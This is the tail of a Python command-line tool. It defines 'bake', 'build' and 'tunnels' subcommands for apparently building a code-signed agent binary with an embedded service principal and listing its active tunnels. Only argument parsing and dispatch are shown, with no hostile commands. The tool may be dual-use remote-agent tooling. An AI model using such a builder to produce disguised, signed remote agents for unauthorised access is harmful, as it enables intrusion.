    p_build.add_argument("--timestamp", default=DEFAULT_TIMESTAMP_URL, help="RFC3161 timestamp URL; use empty string to disable")
    p_build.add_argument("--sign-name", default=DEFAULT_SIGN_NAME, help="osslsigncode description")
    p_build.add_argument("--sign-url", default=DEFAULT_SIGN_URL, help="osslsigncode URL")
    p_build.add_argument("--cert-subject", default=DEFAULT_SIGN_SUBJECT, help="self-signed certificate subject used when --pfx is omitted")
    add_config_args(p_build)
    add_polling_arg(p_build)

    # --- tunnels ---
    p_tunnels = sub.add_parser("tunnels", help="List active tunnels for the baked service principal")
    add_config_args(p_tunnels)

    args = parser.parse_args(argv)

    try:
        if args.command == "bake":
            source = load_config_for_command(args, parser=parser)
            prepare_bake_config(args, source=source)
            bake(args)

        elif args.command == "build":
            source = load_config_for_command(args, parser=parser)
            prepare_bake_config(args, source=source)
            validate_requested_build_features(args, source=source)
            bake(args)
            build(args)

        elif args.command == "tunnels":
            load_config_for_command(args, parser=parser)
            tunnels(args)
    except (AgentBuilderError, ValueError) as exc:
        parser.error(str(exc))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
